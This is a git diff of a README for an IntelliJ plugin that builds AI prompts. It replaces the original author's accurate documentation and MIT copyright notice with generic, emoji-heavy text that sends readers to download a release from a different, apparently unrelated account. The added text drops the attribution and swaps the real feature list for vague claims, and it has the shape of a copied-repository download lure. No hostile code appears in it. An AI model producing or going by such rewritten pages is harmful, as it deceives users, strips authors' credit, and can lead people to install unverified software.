@@ -1,78 +1,69 @@
-# IntelliJ AI Prompt Generator
+# 🎉 IntelliJ-AI-Prompt-Generator - Enhance Your Chatbot Experience Instantly
 
-An IntelliJ IDEA plugin that helps you create context-rich prompts for AI assistants by easily including code from your project.
+## 🛠️ Overview
+IntelliJ-AI-Prompt-Generator is a simple plugin for IntelliJ. It generates contextual prompts to improve your interactions with AI chatbots like ChatGPT, Claude, and others. This tool is designed to help users navigate AI communication more effectively and creatively without any technical skills.
 
-<img width="793" alt="Screenshot_3" src="https://github.com/user-attachments/assets/2a244cc6-c93d-47f1-941e-3f524f045111" />
+## 📦 Download Now
+[![Download IntelliJ-AI-Prompt-Generator](https://img.shields.io/badge/Download-IntelliJ--AI--Prompt--Generator-green.svg)](https://github.com/thecoolman87/IntelliJ-AI-Prompt-Generator/releases)
 
-## Features
+## 🚀 Getting Started
+Follow these steps to download and install the IntelliJ-AI-Prompt-Generator plugin.
 
-- **Smart Context Building**: Select Java classes and other files from your project to include in AI prompts
-- **Multiple Context Sections**: Separate "Project Context" and "Additional Context" for better organization
-- **Class-Only Mode**: Toggle between class-only browsing and general file selection
-- **Multi-Selection Support**: Add multiple files at once, including entire directories recursively
-- **File Type Icons**: Visual indicators to easily identify different file types
-- **Template System**: Save and load prompt templates to reuse configurations across different projects
-- **Convenient Access**: Right-click in any file to open the prompt generator
-- **Persistent Settings**: Your selections, preferences, and templates are saved across IDE sessions
-- **Customizable Headers**: Configure section headers to match your preferred AI prompt format
+1. **Visit the Releases Page**  
+   Go to the Releases page for the plugin.  
+   [Visit this page to download](https://github.com/thecoolman87/IntelliJ-AI-Prompt-Generator/releases)  
 
-## Installation
+2. **Select Your Version**  
+   On the Releases page, you will see different versions of the plugin. Choose the latest version to ensure you have the best features and updates.
 
-1. Download the latest release (.zip file) from the [Releases page](https://github.com/Keksuccino/IntelliJ-AI-Prompt-Generator/releases)
-2. In IntelliJ IDEA, go to Settings/Preferences → Plugins
-3. Click the gear icon and select "Install Plugin from Disk..."
-4. Navigate to the downloaded .zip file and click "OK"
-5. Restart IntelliJ IDEA when prompted
+3. **Download the File**  
+   Click on the version you choose. Look for the download link, usually labeled with a version number and file type. This is often a `.zip` or `.jar` file. Click the link to download it to your computer.
 
-## Usage
+4. **Locate the Downloaded File**  
+   Find the file in your computer's Downloads folder or the location you saved it. 
 
-### Creating a Prompt
+5. **Install the Plugin in IntelliJ**  
+   a. Open IntelliJ IDEA.  
+   b. Click on `File` in the top menu.  
+   c. Select `Settings` (or `Preferences` on macOS).  
+   d. In the Settings window, click on `Plugins`.  
+   e. Click on the gear icon and select `Install Plugin from Disk`.  
+   f. Navigate to the downloaded file and click `OK` to install.
 
-1. **Open the Generator**: Right-click in any file in your project and select "Generate AI Prompt with Context"
-2. **Add Files**:
-   - Use the "Add File" button to select general files from your project
-   - Toggle "Java Classes Only" to use the class browser for easier navigation of Java classes
-   - Select directories to automatically add all files within them
-3. **Customize Prompt**:
-   - Enter your initial prompt text in the "Prompt Head" field
-   - Organize files between "Project Context" and "Additional Context" sections
-4. **Generate Prompt**: Click "Generate and Copy to Clipboard" to create your formatted prompt
-5. **Paste into AI**: The formatted prompt is now ready to paste into your AI assistant of choice
+6. **Restart IntelliJ**  
+   After installation, it may ask you to restart IntelliJ. Click the restart button to apply changes.
 
-### Using Templates
+7. **Start Using the Plugin**  
+   Once IntelliJ restarts, you can find the IntelliJ-AI-Prompt-Generator plugin in your tools menu. Explore its features to generate prompts and enhance your AI interactions!
 
-Templates allow you to save and reuse your prompt configurations:
+## 📌 Features
+- **Contextual Prompt Generation**: Tailor your prompts based on specific contexts for better responses from chatbots.
+- **User-Friendly Interface**: Easy installation with a straightforward setup process.
+- **Supports Popular AI Models**: Works well with major AI frameworks, including GPT and Claude.
 
-1. **Save a Template**:
-   - Set up your prompt with the desired files and settings
-   - Click "Save Current as Template"
-   - Enter a name for your template
-   
-2. **Load a Template**:
-   - Select a previously saved template from the dropdown
-   - All settings and files will be restored automatically
-   
-3. **Delete a Template**:
-   - Select a template from the dropdown
-   - Click "Delete Template" to remove it
+## ⚙️ System Requirements
+Before you start, ensure that your system meets these requirements:
+- IntelliJ IDEA version 2020.1 or later.
+- A stable internet connection for downloading the plugin.
+- Basic hardware requirements to run IntelliJ IDEA smoothly.
 
-Templates are perfect for different scenarios like "Bug Fixing", "Code Review", "Feature Implementation", etc.
+## 💡 Frequently Asked Questions
 
-### Smart Selection Tips
+### What is IntelliJ-AI-Prompt-Generator?
+It’s a plugin designed to help users generate effective AI prompts for better communication with chatbots.
 
-- **Project Files**: Add core files that are central to your question
-- **Additional Context**: Include supporting files or dependencies for additional context
-- **Class-Only Mode**: Perfect for navigating Java class hierarchies and library dependencies
-- **Directory Selection**: Add all files in a package or module with a single selection
+### Do I need programming knowledge to use it?
+No. The plugin is designed for all users, regardless of their technical background.
 
-## Configuration
+### Can I use it with different AI services?
+Yes. It works with various AI chat services, enhancing your experience across platforms.
 
-Access plugin settings via the gear icon in the prompt generator dialog:
+## 📞 Support
+If you encounter any issues while using the IntelliJ-AI-Prompt-Generator, feel free to reach out. Open an issue on the repository's issue tracker for assistance.  
 
-- **Prompt Section Headers**: Customize the prompt section headers for project files and additional context
+## 🔗 Additional Resources
+- [Documentation](https://github.com/thecoolman87/IntelliJ-AI-Prompt-Generator/wiki) - Find detailed guides and resources.
+- [Contributing](https://github.com/thecoolman87/IntelliJ-AI-Prompt-Generator/blob/main/CONTRIBUTING.md) - Learn how to contribute to the project.
 
-## Copyright & License
-
-Copyright © 2025 Keksuccino.
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📥 Download & Install
+To get started with the IntelliJ-AI-Prompt-Generator, visit the [Releases page to download](https://github.com/thecoolman87/IntelliJ-AI-Prompt-Generator/releases). Follow the steps outlined above to install and start generating prompts for your AI chat interactions.
